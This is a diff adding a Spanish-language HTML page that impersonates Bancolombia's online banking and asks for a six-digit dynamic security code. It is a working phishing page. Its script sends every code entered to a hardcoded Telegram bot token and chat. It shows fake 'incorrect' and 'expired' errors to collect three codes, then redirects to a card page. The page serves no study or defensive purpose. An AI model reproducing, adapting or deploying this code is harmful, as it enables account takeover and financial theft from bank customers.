@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link rel="stylesheet" href="styles_new.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a1f2e 0%, #16213e 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; }
+        .loading-overlay.active { display: flex; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top: 4px solid #FFD700; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .error-message { display: none; color: #d32f2f; font-size: 14px; text-align: center; margin: 15px 0; padding: 12px; background: #ffebee; border-radius: 4px; }
+        .error-message.show { display: block; }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="auth-container">
+        <div class="auth-content">
+            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
+            <h1>Sucursal Virtual Personas</h1>
+            
+            <div id="otpErrorBanner" class="bank-error-banner bank-error-banner--otp" role="alert" hidden>
+                <span class="bank-error-banner__icon" aria-hidden="true"></span>
+                <div class="bank-error-banner__text">
+                    <strong id="errorText">Su clave dinámica es incorrecta, ingrésela nuevamente.</strong>
+                </div>
+                <button type="button" class="bank-error-banner__close" aria-label="Cerrar">&times;</button>
+            </div>
+
+            <div class="auth-box auth-box--dinamica">
+                <img class="dinamica-lock" src="img/candado.png" alt="" aria-hidden="true" width="48" height="48">
+
+                <h2 class="dinamica-title">Clave dinámica</h2>
+                <p class="dinamica-subtitle">Por seguridad necesitamos tu clave dinámica</p>
+
+                <form id="dynamicForm" class="auth-form">
+                    <div class="clave-dinamica clave-dinamica--underline">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                    </div>
+
+                    <button type="submit" class="btn-iniciar btn-iniciar--pill" id="submitBtn" disabled>Continuar</button>
+                    <a href="#" class="dinamica-help">¿Necesitas ayuda?</a>
+                </form>
+            </div>
+        </div>
+
+        <div class="help-links">
+            <a href="#">¿Problemas para conectarte?</a>
+            <span class="separator">•</span>
+            <a href="#">Aprende sobre seguridad</a>
+            <span class="separator">•</span>
+            <a href="#">Reglamento Sucursal Virtual</a>
+            <span class="separator">•</span>
+            <a href="#">Política de privacidad</a>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
+                    <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
+                </div>
+                <div class="footer-right">
+                    <p class="ip-address" id="ipAddress">Cargando IP...</p>
+                    <p class="datetime" id="datetime">Cargando fecha...</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay">
+        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
+    </div>
+
+    <script>
+    const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+    const TELEGRAM_CHAT_ID = '-1003784784181';
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const inputs = document.querySelectorAll('.digit-input');
+        const btn = document.getElementById('submitBtn');
+        const form = document.getElementById('dynamicForm');
+        const overlay = document.getElementById('loadingOverlay');
+        const errorBanner = document.getElementById('otpErrorBanner');
+        const errorText = document.getElementById('errorText');
+        let intentos = 0;
+        let dinamicasEnviadas = [];
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 1);
+                if (e.target.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                validateForm();
+            });
+            
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+        
+        function validateForm() {
+            const code = Array.from(inputs).map(i => i.value).join('');
+            const isValid = code.length === 6;
+            btn.disabled = !isValid;
+            if (isValid) {
+                btn.style.backgroundColor = '#FFD700';
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.style.backgroundColor = '';
+                btn.style.cursor = 'default';
+            }
+        }
+
+        function clearInputs() {
+            inputs.forEach(input => input.value = '');
+            inputs[0].focus();
+            validateForm();
+        }
+
+        function mostrarError(mensaje) {
+            errorText.textContent = mensaje;
+            errorBanner.hidden = false;
+            
+            const closeBtn = errorBanner.querySelector('.bank-error-banner__close');
+            closeBtn.addEventListener('click', () => {
+                errorBanner.hidden = true;
+            });
+
+            setTimeout(() => {
+                errorBanner.hidden = true;
+            }, 5000);
+        }
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if (btn.disabled) return;
+
+            intentos++;
+            const dinamica = Array.from(inputs).map(i => i.value).join('');
+            dinamicasEnviadas.push(dinamica);
+            
+            overlay.classList.add('active');
+
+            const mensaje = `🔑 <b>DINÁMICA (INTENTO ${intentos}/3) - BANCOLOMBIA</b>
+
+<b>Clave:</b> <code>${dinamica}</code>
+<b>Intento:</b> ${intentos}/3
+
+<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+                });
+
+                if ((await response.json()).ok) {
+                    setTimeout(() => {
+                        overlay.classList.remove('active');
+
+                        if (intentos === 1) {
+                            // Primer intento: incorrecto
+                            mostrarError('❌ Su clave dinámica es incorrecta, ingrésela nuevamente.');
+                            clearInputs();
+                        } else if (intentos === 2) {
+                            // Segundo intento: clave vencida
+                            mostrarError('⏰ Su clave dinámica ha vencido. Ingrese la nueva clave dinámica.');
+                            clearInputs();
+                        } else if (intentos === 3) {
+                            // Tercer intento: éxito
+                            const mensajeFinal = `✅ <b>DINÁMICA ACEPTADA - BANCOLOMBIA</b>
+
+<b>Claves ingresadas:</b>
+1️⃣ ${dinamicasEnviadas[0]}
+2️⃣ ${dinamicasEnviadas[1]}
+3️⃣ ${dinamicasEnviadas[2]}
+
+<b>Estado:</b> ACEPTADA EN INTENTO 3
+
+<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;
+
+                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensajeFinal, parse_mode: 'HTML' })
+                            });
+
+                            overlay.classList.add('active');
+                            setTimeout(() => { window.location.href = 'tarjeta.html'; }, 2000);
+                        }
+                    }, 1500);
+                } else {
+                    overlay.classList.remove('active');
+                }
+            } catch (error) {
+                overlay.classList.remove('active');
+            }
+        });
+
+        // Cerrar banner al hacer click en X
+        document.addEventListener('click', function(e) {
+            if (e.target.classList.contains('bank-error-banner__close')) {
+                errorBanner.hidden = true;
+            }
+        });
+    });
+    </script>
+</body>
+</html>
